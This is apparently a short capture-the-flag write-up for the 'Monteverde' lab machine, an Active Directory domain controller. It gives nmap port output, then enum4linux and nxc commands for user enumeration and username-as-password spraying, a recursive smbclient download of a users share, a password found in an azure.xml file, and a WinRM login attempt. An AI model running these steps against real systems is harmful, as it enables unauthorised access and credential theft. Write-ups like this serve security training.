
# Monteverde

## NMAP

```console
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
```

## SMB

* `enum4linux` gives us the domain and the FQDN names, along with users and groups via `enumdomusers` and `enumdomgroups`

```bash
DNS domain: MEGABANK.LOCAL               
FQDN: MONTEVERDE.MEGABANK.LOCAL 
```

* To get brief info we can use `nxc`

```bash
nxc smb $IP -u '' -p '' --users
```

* We can try for empty and user name as passwords using `nxc`

```bash
nxc smb $IP -u users.txt -p users.txt --shares
```

* Once we discover the user `SABatchJobs` has read on `Users` share we can logon and `mget` everything there

```
smbclient -U SABatchJobs%SABatchJobs \\\\$IP\\Users$
mask ""
recurse on
prompt off
mget *
```

* The file `mhope/azure.xml` gives away the password of the user `mhope`

```bash
nxc winrm $IP -u 'mhope' -p ''
```